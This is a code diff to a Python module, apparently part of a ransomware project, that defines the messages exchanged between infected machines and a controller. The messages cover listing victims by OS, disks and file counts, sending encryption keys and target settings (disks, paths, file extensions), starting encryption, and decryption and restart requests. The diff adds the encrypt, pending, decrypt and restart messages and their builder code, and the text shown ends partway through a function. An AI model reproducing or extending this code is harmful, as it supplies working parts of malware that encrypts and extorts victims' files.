@@ -1,32 +1,31 @@
-# Définition des messages
-# List_victim messages
+
 LIST_VICTIM_REQ = {'LIST_REQ': None}
 LIST_VICTIM_RESP = {'VICTIM': 0, 'HASH': '', 'OS': '', 'DISKS': '', 'STATE': '', 'NB_FILES': 0}
 LIST_VICTIM_END = {'LIST_END': None}
-
-# history messages
 HISTORY_REQ = {'HIST_REQ': 0}
 HISTORY_RESP = {'HIST_RESP': 0, 'TIMESTAMP': 0, 'STATE': '', 'NB_FILES': 0}
 HISTORY_END = {'HIST_END': 0}
-
-# change_state message
 CHANGE_STATE = {'CHGSTATE': 0, 'STATE': 'DECRYPT'}
-
-# initialize message
 INITIALIZE_REQ = {'INITIALIZE': '', 'OS': '', 'DISKS': ''}
 INITIALIZE_KEY = {'KEY_RESP': 0, 'KEY': '', 'STATE': ''}
 INITIALIZE_RESP = {'CONFIGURE': 0, 'SETTING': {'DISKS': [], 'PATHS': [], 'FILE_EXT': [], 'FREQ': 0, 'KEY': '', 'STATE' : ''}}
-CRYPT_START = {
-    'CRYPT' : 'id'
-}
 
-# message_type
 MESSAGE_TYPE = {'LIST_REQ': 'LIST_VICTIM_REQ', 'VICTIM': 'LIST_VICTIM_RESP','LIST_END': 'LIST_VICTIM_END','HIST_REQ': 'HISTORY_REQ','HIST_RESP': 'HISTORY_RESP','HIST_END': 'HISTORY_END', 'CHGSTATE': 'CHANGE_STATE',
     'INITIALIZE': 'INITIALIZE_REQ',
     'KEY_RESP': 'INITIALIZE_KEY',
-    'CONFIGURE': 'INITIALIZE_RESP'
+    'CONFIGURE': 'INITIALIZE_RESP',
+    'CRYPT': 'CRYPT_START',
+    'PENDING': 'PENDING_MSG',
+    'DECRYPT': 'DECRYPT_REQ',
+    'RESTART': 'RESTART_REQ',
+    'RESTART_RESP': 'RESTART_RESP'
 }
 
+CRYPT_START = {'CRYPT': 0}
+PENDING_MSG = {'PENDING' : '', 'NB_FILE' : 0}
+DECRYPT_REQ = {'DECRYPT' : '', 'KEY' : ''}
+RESTART_REQ = {'RESTART' : ''}
+RESTART_RESP = {'RESTART_RESP' : '', 'KEY' : ''}
 
 def set_message(select_msg, params=None):
     """
@@ -35,7 +34,26 @@ def set_message(select_msg, params=None):
     :param params: les éventuels paramètres à ajouter au message
     :return: le message sous forme de dictionnaire
     """
+    if select_msg.upper() == 'RESTART_REQ':
+        RESTART_REQ['RESTART'] = params[0]
+        return RESTART_REQ
+
+    if select_msg.upper() == 'RESTART_RESP':
+        RESTART_RESP['RESTART_RESP'] = params[0]
+        RESTART_RESP['KEY'] = params[1]
+        return RESTART_RESP
+
+    if select_msg.upper() == 'DECRYPT_REQ':
+        DECRYPT_REQ['DECRYPT'] = params[0]
+        DECRYPT_REQ['KEY'] = params[1]
+        return DECRYPT_REQ
+
+    if select_msg.upper() == 'PENDING_MSG':
+        PENDING_MSG['PENDING'] = params[0]
+        return PENDING_MSG
+
     if select_msg.upper() == 'CRYPT_START':
+        CRYPT_START['CRYPT'] = params[0]
         return CRYPT_START
 
     if select_msg.upper() == 'LIST_VICTIM_REQ':
